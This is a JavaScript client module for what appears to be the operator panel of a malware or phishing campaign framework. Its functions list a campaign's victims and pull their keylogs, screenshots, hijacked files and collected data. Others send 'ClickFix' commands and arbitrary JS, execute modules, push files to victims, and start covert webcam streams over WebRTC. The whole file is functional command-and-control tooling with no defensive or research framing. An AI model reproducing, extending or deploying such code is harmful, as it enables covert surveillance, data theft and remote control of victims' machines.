import { CAMPAIGN_API } from './endpoints'
import { downloadFile } from './http'

export function decodeBase64Utf8(value) {
  if (!value) return ''

  const binary = atob(value)
  const bytes = Uint8Array.from(binary, character => character.charCodeAt(0))
  return new TextDecoder('utf-8').decode(bytes)
}

export function createVictimsClient(apiClient) {
  return {
    async getCampaignVictims(campaignId, options = {}) {
      const data = await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims`,
        options
      )
      return data.victims || []
    },

    async getVictimDetails(campaignId, victimId, options = {}) {
      return await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims/${victimId}`,
        options
      )
    },

    async createVictimStreamAccess(campaignId, victimId) {
      return await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/stream-access`,
        { method: 'POST' }
      )
    },

    async exportVictim(campaignId, victimId) {
      const response = await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/export`,
        { method: 'GET', responseType: 'blob' }
      )

      // Build the filename client-side to avoid parsing Content-Disposition.
      const date = new Date().toISOString().slice(0, 19).replace(/[-:T]/g, '')
      const filename = `victim-${victimId}-export-${date}.zip`

      downloadFile(response.data, filename)
      return true
    },

    async captureScreenshot(campaignId, victimId) {
      return await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/screenshots`,
        { method: 'POST' }
      )
    },

    async getScreenshots(campaignId, victimId) {
      const pageSize = 500
      const screenshots = []
      let skip = 0

      while (true) {
        const data = await apiClient.request(
          `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/screenshots?skip=${skip}&limit=${pageSize}`
        )
        const page = data.screenshots || []
        screenshots.push(...page)
        skip += page.length

        if (page.length === 0 || screenshots.length >= (data.total || 0)) {
          return screenshots
        }
      }
    },

    async getKeylogs(campaignId, victimId, options = {}) {
      const data = await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/keylogs`,
        options
      )
      return {
        content: decodeBase64Utf8(data.keylogs),
        size: Number(data.size) || 0,
        originalSize: Number(data.original_size) || 0,
        truncated: Boolean(data.truncated)
      }
    },

    async getFilesHijacked(campaignId, victimId) {
      const data = await apiClient.request(`${CAMPAIGN_API}/${campaignId}/victims/${victimId}/files_hijacked`)
      return data.files || []
    },

    async getCollectedInfo(campaignId, victimId, options = {}) {
      return await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/collected_info`,
        options
      )
    },

    async getVictimSummary(campaignId, victimId, options = {}) {
      return await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/summary`,
        options
      )
    },

    async getVictimEngagementStatus(campaignId, victimId) {
      const data = await apiClient.request(`${CAMPAIGN_API}/${campaignId}/victims/${victimId}/engagement`)
      return data.status || 'unknown'
    },

    async getAllVictimEvents(campaignId, victimId, options = {}) {
      return await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/events`,
        options
      )
    },

    async getVictimEvents(campaignId, victimId, eventType, options = {}) {
      const data = await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/events?type=${eventType}`,
        options
      )
      return data.events || []
    },

    async sendClickFix(campaignId, victimId, command) {
      return await apiClient.request(`${CAMPAIGN_API}/${campaignId}/victims/${victimId}/clickfix`, {
        method: 'POST',
        body: JSON.stringify({ command })
      })
    },

    async sendJSCommand(campaignId, victimId, command) {
      return await apiClient.request(`${CAMPAIGN_API}/${campaignId}/victims/${victimId}/exec`, {
        method: 'POST',
        body: JSON.stringify({ command })
      })
    },

    async getVictimModulesData(campaignId, victimId, moduleId = null) {
      let url = `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/modules-data`
      if (moduleId) {
        url += `?module_id=${moduleId}`
      }
      return await apiClient.request(url, { method: 'GET' })
    },

    async executeModuleOnVictim(campaignId, victimId, moduleId, params) {
      return await apiClient.request(`${CAMPAIGN_API}/${campaignId}/victims/${victimId}/execute-module`, {
        method: 'POST',
        body: JSON.stringify({ module_id: moduleId, params })
      })
    },

    async sendFileToVictim(campaignId, victimId, file) {
      const formData = new FormData()
      formData.append('file', file)

      return await apiClient.request(`${CAMPAIGN_API}/${campaignId}/victims/${victimId}/send-file`, {
        method: 'POST',
        body: formData
      })
    },

    async getFileBlob(fileUrl) {
      // Strip a leading slash to avoid a double slash against the base URL.
      const endpoint = fileUrl.startsWith('/') ? fileUrl.slice(1) : fileUrl

      return await apiClient.request(endpoint, {
        method: 'GET',
        responseType: 'blob'
      })
    },

    async requestWebcamOffer(campaignId, victimId, sessionId) {
      try {
        const response = await apiClient.request(
          `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/webcam/request-offer`,
          {
            method: 'POST',
            body: JSON.stringify({ session_id: sessionId })
          }
        )

        if (!response) {
          throw new Error('Empty response from server')
        }
        if (!response.offer) {
          throw new Error('No offer received from victim')
        }

        return response
      } catch (error) {
        if (error.message.includes('not found')) {
          throw new Error('Victim not connected', { cause: error })
        } else if (error.message.includes('timed out')) {
          throw new Error('Victim did not respond (timeout)', { cause: error })
        }
        throw error
      }
    },

    async sendWebcamAnswer(campaignId, victimId, payload) {
      return await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/webcam/send-answer`,
        { method: 'POST', body: JSON.stringify(payload) }
      )
    },

    async sendWebcamICECandidate(campaignId, victimId, payload) {
      return await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/webcam/ice-candidate`,
        { method: 'POST', body: JSON.stringify(payload) }
      )
    },

    async getWebcamICECandidates(campaignId, victimId, sessionId) {
      return await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/webcam/ice-candidates?session_id=${encodeURIComponent(sessionId)}`
      )
    },

    async stopWebcam(campaignId, victimId, sessionId, options = {}) {
      return await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/webcam/stop`,
        {
          ...options,
          method: 'POST',
          body: JSON.stringify({ session_id: sessionId })
        }
      )
    },

    async getWebcamStatus(campaignId, victimId) {
      return await apiClient.request(
        `${CAMPAIGN_API}/${campaignId}/victims/${victimId}/webcam/status`
      )
    }
  }
}
